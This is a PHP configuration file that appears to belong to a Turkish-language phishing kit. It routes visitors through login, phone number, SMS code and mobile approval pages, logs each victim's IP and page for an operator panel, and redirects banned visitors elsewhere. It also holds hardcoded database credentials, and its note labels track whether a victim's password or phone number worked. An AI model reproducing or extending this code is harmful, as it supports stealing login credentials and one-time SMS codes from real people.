<?php
// Plesk direct connection configuration
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
session_start();
ob_start();
date_default_timezone_set('Europe/Istanbul');
 
$db = new PDO("mysql:host=localhost;dbname=wafawef;charset=utf8", "wearawer", "V^hdDdc8$0t6wrYt");
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); 
require_once 'AjaxClass.php';

$ajax = new Ajax($db);

DEFINE('IP', $ajax->getIP());
DEFINE('BAN_URL',"https://www.youtube.com/watch?v=S1mbxjBTiIE");

$script = basename($_SERVER['SCRIPT_NAME']);
$pageMap = [
    'giris.php' => 'Giriş Sayfası',
    'telefon.php' => 'Telefon Numara Girişi',
    'bekle.php' => 'Bekle',
    'sms.php' => 'SMS',
    'mobil-onay.php' => 'Mobil-Onay',
    'hatali-sms.php' => 'Hatalı SMS',
    'hatali.php' => 'Şifre Hata',
    'basarili.php' => 'Başarılı',
    'ping.php' => 'Giriş Sayfası'
];
$currentPage = isset($pageMap[$script]) ? $pageMap[$script] : 'Anasayfa';

// Skip online updates for Plesk panel requests to avoid corrupting visitor online metrics
if (strpos($_SERVER['SCRIPT_NAME'], '/gmypanel/') === false && strpos($_SERVER['SCRIPT_NAME'], '/gmypanel-plesk/') === false) {
    if ($script === 'check_redirect.php') {
        $ajax->updateOnlineTimestampOnly(IP);
    } else {
        $ajax->updateOnline(IP, $currentPage);
    }
}

$session = @$_SESSION['loggedIn'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$acsTime = date('d.m.20y, H:i');

function parseNote($note) {
    $note = trim($note);
    if (empty($note)) {
        return ['selected' => '', 'manual' => ''];
    }
    $decoded = json_decode($note, true);
    if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
        return [
            'selected' => isset($decoded['selected']) ? $decoded['selected'] : '',
            'manual' => isset($decoded['manual']) ? $decoded['manual'] : ''
        ];
    }
    
    // Fallback for legacy plain text notes
    $options = ["Bildirim vermedi", "Şifre hatalı", "Tel no hatalı", "Bırçi", "Giriş Yapıldı"];
    if (in_array($note, $options)) {
        return ['selected' => $note, 'manual' => ''];
    }
    return ['selected' => '', 'manual' => $note];
}

